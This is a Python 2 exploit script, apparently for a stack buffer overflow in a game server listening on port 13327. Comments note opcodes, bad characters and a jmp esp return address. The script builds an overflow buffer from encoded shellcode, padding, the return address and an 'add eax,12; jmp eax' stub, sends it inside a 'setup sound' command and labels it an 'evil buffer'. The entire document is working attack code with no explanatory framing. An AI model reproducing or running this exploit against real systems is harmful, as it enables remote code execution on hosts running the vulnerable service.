#!/usr/bin/python
import socket
host= "127.0.0.1"

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
#/x00 /x0A /x0D /x20 bad characters
#83C00CFFE0
#return address
#08134597: jmp esp

shellcode=(
"\xda\xd4\xd9\x74\x24\xf4\x5f\xbb\xd3\xba\xb1\xbe\x2b\xc9\xb1" +
"\x14\x31\x5f\x19\x83\xef\xfc\x03\x5f\x15\x31\x4f\x80\x65\x42" +
"\x53\xb0\xda\xff\xfe\x35\x54\x1e\x4e\x5f\xab\x60\xf4\xfe\x61" +
"\x08\x09\xff\x94\x94\x67\xef\xc7\x74\xf1\xee\x82\x12\x59\x3c" +
"\xd2\x53\x18\xba\x60\x67\x2b\xa4\x4b\xe7\x08\x99\x32\x2a\x0e" +
"\x4a\xe3\xde\x30\x35\xd9\x9e\x06\xbc\x19\xf6\xb7\x11\xa9\x6e" +
"\xa0\x42\x2f\x07\x5e\x14\x4c\x87\xcd\xaf\x72\x97\xf9\x62\xf4"
)

ret = "\x97\x45\x13\x08" # jmp esp
addandjump = "\x83\xC0\x0C\xFF\xE0" # add eax,12 and jmp eax

crash = shellcode + "\x41" * (4368-105) + ret + addandjump + "\x90\x90" # the last \x90 is a buffer to of 4 bytes

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host,13327))
s.send(buffer)
data=s.recv(1024)
print data
s.close()
print "[*]Payload Sent !"
